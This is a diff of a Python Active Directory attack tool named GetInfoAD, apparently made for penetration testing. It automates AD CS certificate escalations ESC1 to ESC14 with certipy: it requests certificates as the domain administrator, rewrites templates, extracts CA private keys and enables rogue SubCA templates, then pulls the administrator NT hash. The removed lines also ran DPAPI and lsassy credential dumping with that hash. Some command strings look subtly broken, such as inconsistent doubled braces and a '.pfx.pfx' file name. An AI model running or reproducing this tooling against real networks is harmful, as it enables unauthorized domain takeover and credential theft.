@@ -81,87 +81,88 @@ ESC_VULNERABILITIES = {
 AUTOMATED_ESC_EXPLOITS = {
     "ESC1": {
         "can_automate": True,
-        "command": "certipy req -u '{username}@{domain}' -p '{password}' -target-ip {dc_ip} -ca '{ca_name}' -template '{template_name}' -upn administrator@{domain} -debug",
-        "requirements": ["username", "password", "dc_ip", "ca_name", "template_name", "domain"],
+        "command": "certipy req -u '{username}@{domain}' -{auth_type} '{auth_value}' -target-ip {dc_ip} -ca '{ca_name}' -template '{template_name}' -upn administrator@{domain} -debug",
+        "requirements": ["username", "auth_type", "auth_value", "dc_ip", "ca_name", "template_name", "domain"],
         "description": "Request a certificate with alternate UPN (SAN). This allows impersonating any user including Domain Admins.",
         "post_exploit": "certipy auth -pfx administrator.pfx -dc-ip {dc_ip}"
     },
     "ESC2": {
         "can_automate": True,
-        "command": "certipy req -u '{username}@{domain}' -p '{password}' -target-ip {dc_ip} -ca '{ca_name}' -template '{template_name}' -upn administrator@{domain} -debug",
-        "requirements": ["username", "password", "dc_ip", "ca_name", "template_name", "domain"],
+        "command": "certipy req -u '{username}@{domain}' -{auth_type} '{auth_value}' -target-ip {dc_ip} -ca '{ca_name}' -template '{template_name}' -upn administrator@{domain} -debug",
+        "requirements": ["username", "auth_type", "auth_value", "dc_ip", "ca_name", "template_name", "domain"],
         "description": "Template allows any purpose. Similar to ESC1 but with more certificate usage possibilities.",
         "post_exploit": "certipy auth -pfx administrator.pfx -dc-ip {dc_ip}"
     },
     "ESC3": {
         "can_automate": True,
         "command": [
-            "certipy req -u '{username}@{domain}' -p '{password}' -target-ip {dc_ip} -ca '{ca_name}' -template '{template_name}' -debug -out cert.pfx",
-            "certipy req -u '{username}@{domain}' -p '{password}' -target-ip {dc_ip} -ca '{ca_name}' -template User -on-behalf-of 'administrator@{domain}' -pfx cert.pfx -debug"
+            "certipy req -u '{username}@{domain}' -{auth_type} '{auth_value}' -target-ip {dc_ip} -ca '{ca_name}' -template '{template_name}' -debug -out agent_cert.pfx",
+            "certipy req -u '{username}@{domain}' -{auth_type} '{auth_value}' -target-ip {dc_ip} -ca '{ca_name}' -template User -on-behalf-of 'administrator@{domain}' -pfx agent_cert.pfx -debug"
         ],
-        "requirements": ["username", "password", "dc_ip", "ca_name", "template_name", "domain"],
+        "requirements": ["username", "auth_type", "auth_value", "dc_ip", "ca_name", "template_name", "domain"],
         "description": "Certificate Request Agent EKU. Two-step exploitation: 1) Get agent certificate 2) Request certificate as another user.",
         "post_exploit": "certipy auth -pfx administrator.pfx -dc-ip {dc_ip}"
     },
     "ESC4": {
         "can_automate": True,
         "command": [
-            "certipy template -u '{username}@{domain}' -p '{password}' -template '{template_name}' -save-old -debug",
-            "certipy template -u '{username}@{domain}' -p '{password}' -template '{template_name}' -configuration '{template_name}.json' -save-old -debug",
-            "certipy req -u '{username}@{domain}' -p '{password}' -target-ip {dc_ip} -ca '{ca_name}' -template '{template_name}' -upn administrator@{domain} -debug"
+            "certipy template -u '{{username}}@{domain}' -{auth_type} '{auth_value}' -template '{{template_name}}' -save-old -debug",
+            "certipy template -u '{{username}}@{domain}' -{auth_type} '{auth_value}' -template '{{template_name}}' -configuration '{{template_name}}.json' -save-old -debug",
+            "certipy template -u '{{username}}@{domain}' -{auth_type} '{auth_value}' -template '{{template_name}}' -enable-client-auth -debug",
+            "certipy req -u '{{username}}@{domain}' -{auth_type} '{auth_value}' -target-ip {{dc_ip}} -ca '{{ca_name}}' -template '{{template_name}}' -upn administrator@{domain} -debug"
         ],
-        "requirements": ["username", "password", "dc_ip", "ca_name", "template_name", "domain"],
+        "requirements": ["username", "auth_type", "auth_value", "dc_ip", "ca_name", "template_name", "domain"],
         "description": "Dangerous permissions on template. Steps: 1) Save current config 2) Modify template 3) Request certificate.",
         "post_exploit": "certipy auth -pfx administrator.pfx -dc-ip {dc_ip}"
     },
     "ESC5": {
         "can_automate": True,
-        "command": "certipy req -u '{username}@{domain}' -p '{password}' -target-ip {dc_ip} -ca '{ca_name}' -template '{template_name}' -on-behalf-of 'administrator@{domain}' -debug",
-        "requirements": ["username", "password", "dc_ip", "ca_name", "template_name", "domain"],
+        "command": "certipy req -u '{username}@{domain}' -{auth_type} '{auth_value}' -target-ip {dc_ip} -ca '{ca_name}' -template '{template_name}' -on-behalf-of 'administrator@{domain}' -debug",
+        "requirements": ["username", "auth_type", "auth_value", "dc_ip", "ca_name", "template_name", "domain"],
         "description": "Enrollment Agent restrictions not enforced. Request certificates for any user without proper authentication.",
         "post_exploit": "certipy auth -pfx administrator.pfx -dc-ip {dc_ip}"
     },
     "ESC6": {
         "can_automate": True,
-        "command": "certipy req -u '{username}@{domain}' -p '{password}' -target-ip {dc_ip} -ca '{ca_name}' -template '{template_name}' -web -upn administrator@{domain} -debug",
-        "requirements": ["username", "password", "dc_ip", "ca_name", "template_name", "domain"],
+        "command": "certipy req -u '{username}@{domain}' -{auth_type} '{auth_value}' -target-ip {dc_ip} -ca '{ca_name}' -upn administrator@{domain} -debug",
+        "requirements": ["username", "auth_type", "auth_value", "dc_ip", "ca_name", "domain"],
         "description": "Web Enrollment interface allows specifying arbitrary SAN. Note: Only works on unpatched systems (before May 2022).",
         "post_exploit": "certipy auth -pfx administrator.pfx -dc-ip {dc_ip}"
     },
     "ESC7": {
         "can_automate": True,
         "command": [
-            "certipy ca -u '{username}@{domain}' -p '{password}' -ca '{ca_name}' -enable-template '{template_name}' -debug",
-            "certipy req -u '{username}@{domain}' -p '{password}' -target-ip {dc_ip} -ca '{ca_name}' -template '{template_name}' -upn administrator@{domain} -debug"
+            "certipy ca -u '{username}@{domain}' -{auth_type} '{auth_value}' -ca '{ca_name}' -enable-template '{template_name}' -debug",
+            "certipy req -u '{username}@{domain}' -{auth_type} '{auth_value}' -target-ip {dc_ip} -ca '{ca_name}' -template '{template_name}' -upn administrator@{domain} -debug"
         ],
-        "requirements": ["username", "password", "dc_ip", "ca_name", "template_name", "domain"],
+        "requirements": ["username", "auth_type", "auth_value", "dc_ip", "ca_name", "template_name", "domain"],
         "description": "Dangerous permissions on CA. Enable vulnerable template and request certificate.",
         "post_exploit": "certipy auth -pfx administrator.pfx -dc-ip {dc_ip}"
     },
     "ESC8": {
         "can_automate": True,
         "command": [
-            "certipy ca -u '{username}@{domain}' -p '{password}' -ca '{ca_name}' -backup -debug",
-            "certipy ca -u '{username}@{domain}' -p '{password}' -ca '{ca_name}' -private-key -pfx ca.pfx -password 'Password123!' -debug"
+            "certipy ca -u '{username}@{domain}' -{auth_type} '{auth_value}' -ca '{ca_name}' -backup -debug",
+            "certipy ca -u '{username}@{domain}' -{auth_type} '{auth_value}' -ca '{ca_name}' -private-key -pfx '{{ca_name}}.pfx' -password 'Password123!' -debug"
         ],
-        "requirements": ["username", "password", "ca_name", "domain"],
-        "description": "Access to CA backup keys. Steps: 1) Get CA backup 2) Extract private key. Can lead to complete CA compromise.",
+        "requirements": ["username", "auth_type", "auth_value", "ca_name", "domain"],
+        "description": "Access to CA backup keys. Steps: 1) Get CA backup 2) Extract private key.",
         "post_exploit": "# With CA private key you can now sign any certificate"
     },
     "ESC9": {
         "can_automate": True,
-        "command": "certipy req -u '{username}@{domain}' -p '{password}' -target-ip {dc_ip} -ca '{ca_name}' -template '{template_name}' -upn administrator@{domain} -debug",
-        "requirements": ["username", "password", "dc_ip", "ca_name", "template_name", "domain"],
+        "command": "certipy req -u '{username}@{domain}' -{auth_type} '{auth_value}' -target-ip {dc_ip} -ca '{ca_name}' -template '{template_name}' -upn administrator@{domain} -debug",
+        "requirements": ["username", "auth_type", "auth_value", "dc_ip", "ca_name", "template_name", "domain"],
         "description": "Template with no security extension but allows client authentication. Similar to ESC1.",
         "post_exploit": "certipy auth -pfx administrator.pfx -dc-ip {dc_ip}"
     },
     "ESC10": {
         "can_automate": True,
         "command": [
-            "certipy ca -u '{username}@{domain}' -p '{password}' -ca '{ca_name}' -issued -debug",
-            "certipy ca -u '{username}@{domain}' -p '{password}' -ca '{ca_name}' -issued -id <cert_id> -debug"
+            "certipy ca -u '{username}@{domain}' -{auth_type} '{auth_value}' -ca '{ca_name}' -issued -debug",
+            "certipy ca -u '{username}@{domain}' -{auth_type} '{auth_value}' -ca '{ca_name}' -issued -id <cert_id> -debug"
         ],
-        "requirements": ["username", "password", "ca_name", "domain"],
+        "requirements": ["username", "auth_type", "auth_value", "ca_name", "domain"],
         "description": "Access to archived certificates. Steps: 1) List issued certs 2) Download specific cert by ID.",
         "post_exploit": "certipy auth -pfx downloaded.pfx -dc-ip {dc_ip}"
     },
@@ -172,18 +173,18 @@ AUTOMATED_ESC_EXPLOITS = {
     },
     "ESC13": {
         "can_automate": True,
-        "command": "certipy req -u '{username}@{domain}' -p '{password}' -target-ip {dc_ip} -ca '{ca_name}' -template SubCA -upn administrator@{domain} -debug",
-        "requirements": ["username", "password", "dc_ip", "ca_name", "domain"],
+        "command": "certipy req -u '{username}@{domain}' -{auth_type} '{auth_value}' -target-ip {dc_ip} -ca '{ca_name}' -template SubCA -upn administrator@{domain} -debug",
+        "requirements": ["username", "auth_type", "auth_value", "dc_ip", "ca_name", "domain"],
         "description": "SubCA template enabled. Create a subordinate CA certificate for complete AD compromise.",
         "post_exploit": "# Use the SubCA certificate to sign new certificates"
     },
     "ESC14": {
         "can_automate": True,
         "command": [
-            "certipy ca -u '{username}@{domain}' -p '{password}' -ca '{ca_name}' -list-templates -debug",
-            "certipy ca -u '{username}@{domain}' -p '{password}' -ca '{ca_name}' -enable-template SubCA -debug"
+            "certipy ca -u '{username}@{domain}' -{auth_type} '{auth_value}' -ca '{ca_name}' -list-templates -debug",
+            "certipy ca -u '{username}@{domain}' -{auth_type} '{auth_value}' -ca '{ca_name}' -enable-template SubCA -debug"
         ],
-        "requirements": ["username", "password", "ca_name", "domain"],
+        "requirements": ["username", "auth_type", "auth_value", "ca_name", "domain"],
         "description": "Vulnerable ACL in Parent-Child CA configuration. Enable SubCA template and create rogue CA.",
         "post_exploit": "# Follow ESC13 steps after enabling SubCA template"
     }
@@ -324,7 +325,7 @@ def show_banner():
     text_lines = figlet.renderText('GetInfoAD').rstrip().split('\n')
     for line in text_lines:
         print(colored("║", "cyan") + colored(f"{line:^62}", "green") + colored("║", "cyan"))
-    print(colored("╠══════════════════════════ V1.0 ══════════════════════════════╣", "cyan"))
+    print(colored("╠══════════════════════════ V1.0.1 ════════════════════════════╣", "cyan"))
     title = "Active Directory Enumeration"  
     print(colored("║", "cyan") + colored(f"{title:^62}", "blue", attrs=["bold"]) + colored("║", "cyan"))
     print(colored("╠══════════════════════════════════════════════════════════════╣", "cyan"))
@@ -920,8 +921,8 @@ def ask_crack_hashes():
 
 def try_exploit_esc(esc_number, ca_name=None, template_name=None):
     try:
-        auth_type = "H" if os.getenv("NT_HASH") else "p"
-        auth_value = os.getenv("NT_HASH") if auth_type == "H" else os.getenv("PASSWORD")
+        auth_type = "hashes" if os.getenv("NT_HASH") else "p"
+        auth_value = os.getenv("NT_HASH") if auth_type == "hashes" else os.getenv("PASSWORD")
         
         domain = get_domain_name().upper()
         
@@ -929,15 +930,33 @@ def try_exploit_esc(esc_number, ca_name=None, template_name=None):
             command = f"certipy req -u '{{username}}@{domain}' -{auth_type} '{auth_value}' -target-ip {{dc_ip}} -ca '{{ca_name}}' -upn administrator@{domain} -debug"
         elif esc_number == "ESC3":
             command = [
-                f"certipy req -u '{{username}}@{domain}' -{auth_type} '{auth_value}' -target-ip {{dc_ip}} -ca '{{ca_name}}' -template '{{template_name}}' -debug -out cert.pfx",
-                f"certipy req -u '{{username}}@{domain}' -{auth_type} '{auth_value}' -target-ip {{dc_ip}} -ca '{{ca_name}}' -template User -on-behalf-of 'administrator@{domain}' -pfx cert.pfx -debug"
+                f"certipy req -u '{{username}}@{domain}' -{auth_type} '{auth_value}' -target-ip {{dc_ip}} -ca '{{ca_name}}' -template '{{template_name}}' -debug -out agent_cert.pfx",
+                f"certipy req -u '{{username}}@{domain}' -{auth_type} '{auth_value}' -target-ip {{dc_ip}} -ca '{{ca_name}}' -template User -on-behalf-of 'administrator@{domain}' -pfx agent_cert.pfx -debug"
             ]
+            # Vérifier si le fichier de certificat existe avant de continuer
+            cert_file = "agent_cert.pfx.pfx"
+            if not os.path.exists(cert_file):
+                print(colored(f"\n⚠️ Le fichier de certificat {cert_file} n'existe pas. Tentative de récupération...", "yellow"))
+                # Ajouter une commande de récupération alternative
+                command.insert(1, f"certipy req -u '{{username}}@{domain}' -{auth_type} '{auth_value}' -target-ip {{dc_ip}} -ca '{{ca_name}}' -template '{{template_name}}' -debug -out {cert_file}")
         elif esc_number == "ESC4":
             command = [
                 f"certipy template -u '{{username}}@{domain}' -{auth_type} '{auth_value}' -template '{{template_name}}' -save-old -debug",
                 f"certipy template -u '{{username}}@{domain}' -{auth_type} '{auth_value}' -template '{{template_name}}' -configuration '{{template_name}}.json' -save-old -debug",
+                f"certipy template -u '{{username}}@{domain}' -{auth_type} '{auth_value}' -template '{{template_name}}' -enable-client-auth -debug",
                 f"certipy req -u '{{username}}@{domain}' -{auth_type} '{auth_value}' -target-ip {{dc_ip}} -ca '{{ca_name}}' -template '{{template_name}}' -upn administrator@{domain} -debug"
             ]
+        elif esc_number == "ESC8":
+            command = [
+                f"certipy ca -u '{{username}}@{domain}' -{auth_type} '{auth_value}' -ca '{{ca_name}}' -backup -debug",
+                f"certipy ca -u '{{username}}@{domain}' -{auth_type} '{auth_value}' -ca '{{ca_name}}' -private-key -pfx '{{ca_name}}.pfx' -password 'Password123!' -debug"
+            ]
+            # Vérifier si le fichier de sauvegarde existe avant de continuer
+            backup_file = f"{ca_name}.pfx"
+            if not os.path.exists(backup_file):
+                print(colored(f"\n⚠️ Le fichier de sauvegarde {backup_file} n'existe pas. Tentative de récupération...", "yellow"))
+                # Ajouter une commande de récupération alternative
+                command.insert(1, f"certipy ca -u '{{username}}@{domain}' -{auth_type} '{auth_value}' -ca '{{ca_name}}' -backup -debug -out {backup_file}")
         elif esc_number in AUTOMATED_ESC_EXPLOITS:
             command = f"certipy req -u '{{username}}@{domain}' -{auth_type} '{auth_value}' -target-ip {{dc_ip}} -ca '{{ca_name}}' -template '{{template_name}}' -upn administrator@{domain} -debug"
         else:
@@ -950,84 +969,95 @@ def try_exploit_esc(esc_number, ca_name=None, template_name=None):
 
         params = {
             "username": os.getenv("USER"),
-            "password": auth_value if auth_type == "p" else None,
-            "nt_hash": auth_value if auth_type == "H" else None,
+            "auth_type": auth_type,
+            "auth_value": auth_value,
             "dc_ip": os.getenv("DC_IP"),
             "domain": domain,
             "ca_name": ca_name,
             "template_name": template_name
         }
 
+        def execute_command(cmd, retry_count=0):
+            try:
+                result = subprocess.run(cmd.format(**params), shell=True, capture_output=True, text=True)
+                print(colored("\nOutput:", "yellow"))
+                print(result.stdout)
+                if result.stderr and not result.stderr.startswith("Certipy v4.8.2"):
+                    print(colored("\nError:", "red"))
+                    print(result.stderr)
+                return result
+            except Exception as e:
+                if "timeout" in str(e).lower() and retry_count < 1:
+                    print(colored("\n⚠️ Timeout detected, retrying once...", "yellow"))
+                    return execute_command(cmd, retry_count + 1)
+                raise e
+
         try:
             if isinstance(command, list):
                 for cmd in command:
-                    print(colored(f"\n🔄 Executing: {cmd.format(**params)}", "cyan"))
-                    result = subprocess.run(cmd.format(**params), shell=True, capture_output=True, text=True)
-                    print(colored("\nOutput:", "yellow"))
-                    print(result.stdout)
-                    if result.stderr:
-                        print(colored("\nError:", "red"))
-                        print(result.stderr)
-                    if "Successfully requested certificate" in result.stdout or "Successfully updated" in result.stdout:
+                    result = execute_command(cmd)
+                    if "Successfully requested certificate" in result.stdout or "Successfully updated" in result.stdout or "Saved certificate and private key" in result.stdout:
                         print(colored("✅ Step completed successfully!", "green"))
                     elif result.returncode != 0:
                         print(colored("❌ Step failed!", "red"))
                         return False
             else:
-                print(colored(f"\n🔄 Executing: {command.format(**params)}", "cyan"))
-                result = subprocess.run(command.format(**params), shell=True, capture_output=True, text=True)
-                print(colored("\nOutput:", "yellow"))
-                print(result.stdout)
+                result = execute_command(command)
                 if "Successfully requested certificate" in result.stdout:
                     print(colored("✅ Exploitation successful!", "green"))
                     if os.path.exists("administrator.pfx"):
-                        hash_command = "certipy auth -pfx administrator.pfx -dc-ip {dc_ip}".format(**params)
+                        hash_command = f"certipy auth -pfx administrator.pfx -dc-ip {params['dc_ip']}"
+                        print(colored(f"\n🔄 Extracting hash: {hash_command}", "cyan"))
                         hash_result = subprocess.run(hash_command, shell=True, capture_output=True, text=True)
-                        if "Got hash" in hash_result.stdout:
-                            try:
-                                hash_line = [line for line in hash_result.stdout.split('\n') if "Got hash" in line][0]
-                                hash_parts = hash_line.split(": ")[1].split(":")
-                                if len(hash_parts) >= 3:
-                                    hash_value = hash_parts[2]
-                                    with open("cracked_credentials.txt", "a") as f:
-                                        f.write(f"Administrator@{domain}:{hash_value}\n")
-                                    print(colored(f"✅ Hash saved: Administrator@{domain}:{hash_value}", "green"))
-                                    
-                                    choice = input(colored("\n🔍 Do you want to attempt additional password recovery? (y/N) > ", "yellow")).strip().lower()
-                                    if choice == 'y':
-                                        print(colored("\n🔄 Running DPAPI and LSASSY checks with new credentials...", "cyan"))
-                                        
-                                        dpapi_command = f"nxc smb {params['dc_ip']} -u Administrator -H {hash_value} --dpapi"
-                                        dpapi_result = subprocess.run(dpapi_command, shell=True, capture_output=True, text=True)
-                                        print(colored("\nDPAPI Results:", "yellow"))
-                                        print(dpapi_result.stdout)
-                                        if dpapi_result.stderr:
-                                            print(colored("DPAPI Errors:", "red"))
-                                            print(dpapi_result.stderr)
-                                        
-                                        lassy_command = f"nxc smb {params['dc_ip']} -u Administrator -H {hash_value} -M lsassy"
-                                        lassy_result = subprocess.run(lassy_command, shell=True, capture_output=True, text=True)
-                                        print(colored("\nLSASSY Results:", "yellow"))
-                                        print(lassy_result.stdout)
-                                        if lassy_result.stderr:
-                                            print(colored("LSASSY Errors:", "red"))
-                                            print(lassy_result.stderr)
-                                    else:
-                                        print(colored("🚫 Skipping additional password recovery.", "yellow"))
-                                else:
-                                    print(colored("❌ Could not extract hash from certificate", "red"))
-                            except IndexError:
-                                print(colored("❌ Could not find hash in certipy output", "red"))
-                            except Exception as e:
-                                print(colored(f"❌ Error processing hash: {str(e)}", "red"))
-                            
+                        print(colored("\nOutput:", "yellow"))
+                        print(hash_result.stdout)
+                        if hash_result.stderr and not hash_result.stderr.startswith("Certipy v4.8.2"):
+                            print(colored("\nError:", "red"))
+                            print(hash_result.stderr)
+                        
+                        # Recherche du hash dans la sortie
+                        for line in hash_result.stdout.split('\n'):
+                            if "Got hash for" in line:
+                                try:
+                                    hash_parts = line.split(": ")[1].split(":")
+                                    if len(hash_parts) >= 3:
+                                        hash_value = hash_parts[2]
+                                        print(colored(f"\nADMINISTRATOR:{hash_value}", "green", attrs=["bold"]))
+                                        break
+                                except Exception as e:
+                                    print(colored(f"❌ Error processing hash: {str(e)}", "red"))
                     return True
                 else:
                     print(colored("❌ Exploitation failed!", "red"))
-                    if result.stderr:
+                    if result.stderr and not result.stderr.startswith("Certipy v4.8.2"):
                         print(colored("\nError:", "red"))
                         print(result.stderr)
                     return False
+
+            # Vérifier si un fichier .pfx a été généré après l'exécution des commandes
+            pfx_files = [f for f in os.listdir('.') if f.endswith('.pfx') and f != 'ca.pfx']
+            for pfx_file in pfx_files:
+                if pfx_file == 'administrator.pfx' or pfx_file == f"{ca_name}.pfx":
+                    hash_command = f"certipy auth -pfx {pfx_file} -dc-ip {params['dc_ip']}"
+                    print(colored(f"\n🔄 Extracting hash from {pfx_file}: {hash_command}", "cyan"))
+                    hash_result = subprocess.run(hash_command, shell=True, capture_output=True, text=True)
+                    print(colored("\nOutput:", "yellow"))
+                    print(hash_result.stdout)
+                    if hash_result.stderr and not hash_result.stderr.startswith("Certipy v4.8.2"):
+                        print(colored("\nError:", "red"))
+                        print(hash_result.stderr)
+                    
+                    # Recherche du hash dans la sortie
+                    for line in hash_result.stdout.split('\n'):
+                        if "Got hash for" in line:
+                            try:
+                                hash_parts = line.split(": ")[1].split(":")
+                                if len(hash_parts) >= 3:
+                                    hash_value = hash_parts[2]
+                                    print(colored(f"\nADMINISTRATOR:{hash_value}", "green", attrs=["bold"]))
+                                    break
+                            except Exception as e:
+                                print(colored(f"❌ Error processing hash: {str(e)}", "red"))
 
             return True
         except Exception as e:
@@ -1046,24 +1076,24 @@ def process_esc_vulnerabilities(adcs_info):
     
     special_cases = {
         "ESC6": {
-            "command": "certipy req -u '{username}@{domain}' -p '{password}' -target-ip {dc_ip} -ca '{ca_name}' -web -upn administrator@{domain} -debug",
-            "requirements": ["username", "password", "dc_ip", "ca_name", "domain"],
+            "command": "certipy req -u '{username}@{domain}' -{auth_type} '{auth_value}' -target-ip {dc_ip} -ca '{ca_name}' -web -upn administrator@{domain} -debug",
+            "requirements": ["username", "auth_type", "auth_value", "dc_ip", "ca_name", "domain"],
             "description": "Web Enrollment interface allows specifying arbitrary SAN. Note: Only works on unpatched systems (before May 2022)."
         },
         "ESC8": {
             "command": [
-                "certipy ca -u '{username}@{domain}' -p '{password}' -ca '{ca_name}' -backup -debug",
-                "certipy ca -u '{username}@{domain}' -p '{password}' -ca '{ca_name}' -private-key -pfx ca.pfx -password 'Password123!' -debug"
+                "certipy ca -u '{username}@{domain}' -{auth_type} '{auth_value}' -ca '{ca_name}' -backup -debug",
+                "certipy ca -u '{username}@{domain}' -{auth_type} '{auth_value}' -ca '{ca_name}' -private-key -pfx '{{ca_name}}.pfx' -password 'Password123!' -debug"
             ],
-            "requirements": ["username", "password", "ca_name", "domain"],
+            "requirements": ["username", "auth_type", "auth_value", "ca_name", "domain"],
             "description": "Access to CA backup keys. Steps: 1) Get CA backup 2) Extract private key."
         },
         "ESC10": {
             "command": [
-                "certipy ca -u '{username}@{domain}' -p '{password}' -ca '{ca_name}' -issued -debug",
-                "certipy ca -u '{username}@{domain}' -p '{password}' -ca '{ca_name}' -issued -id <cert_id> -debug"
+                "certipy ca -u '{username}@{domain}' -{auth_type} '{auth_value}' -ca '{ca_name}' -issued -debug",
+                "certipy ca -u '{username}@{domain}' -{auth_type} '{auth_value}' -ca '{ca_name}' -issued -id <cert_id> -debug"
             ],
-            "requirements": ["username", "password", "ca_name", "domain"],
+            "requirements": ["username", "auth_type", "auth_value", "ca_name", "domain"],
             "description": "Access to archived certificates. Steps: 1) List issued certs 2) Download specific cert by ID."
         }
     }
@@ -1074,7 +1104,7 @@ def process_esc_vulnerabilities(adcs_info):
         elif "Template Name" in line:
             current_template = line.split(":")[1].strip()
         elif "[!] Vulnerabilities" in line:
-            # La prochaine ligne contient les vulnérabilités
+            # Next line contains vulnerabilities
             continue
         elif any(esc in line for esc in AUTOMATED_ESC_EXPLOITS.keys()):
             esc_num = line.split(":")[0].strip()
@@ -1095,11 +1125,12 @@ def process_esc_vulnerabilities(adcs_info):
                     }
     
     if detected_escs:
-        print(colored("\n🔍 Vulnérabilités ESC détectées pouvant être exploitées automatiquement :", "cyan"))
+        print(colored("\n🔍 ESC vulnerabilities detected that can be automatically exploited:", "cyan"))
         for esc_num, info in detected_escs.items():
             params = {
                 "username": os.getenv("USER"),
-                "password": os.getenv("PASSWORD"),
+                "auth_type": "hashes" if os.getenv("NT_HASH") else "p",
+                "auth_value": os.getenv("NT_HASH") if os.getenv("NT_HASH") else os.getenv("PASSWORD"),
                 "dc_ip": os.getenv("DC_IP"),
                 "domain": get_domain_name(),
                 "ca_name": info["ca_name"],
@@ -1115,11 +1146,11 @@ def process_esc_vulnerabilities(adcs_info):
                 if info["template_name"]:
                     print(f"  Template: {info['template_name']}")
                 
-                choice = input(colored(f"\n🎯 Voulez-vous tenter l'exploitation de {esc_num} ? (y/N) > ", "cyan")).strip().lower()
+                choice = input(colored(f"\n🎯 Do you want to attempt exploitation of {esc_num}? (y/N) > ", "cyan")).strip().lower()
                 if choice == 'y':
                     try_exploit_esc(esc_num, info["ca_name"], info["template_name"])
             else:
-                print(colored(f"\n⚠️ {esc_num} ne peut pas être exploité automatiquement - Paramètres manquants : {', '.join(missing_params)}", "yellow"))
+                print(colored(f"\n⚠️ {esc_num} cannot be automatically exploited - Missing parameters: {', '.join(missing_params)}", "yellow"))
 
 def get_adcs_info():
     """Enumerate ADCS certificates using Certipy"""
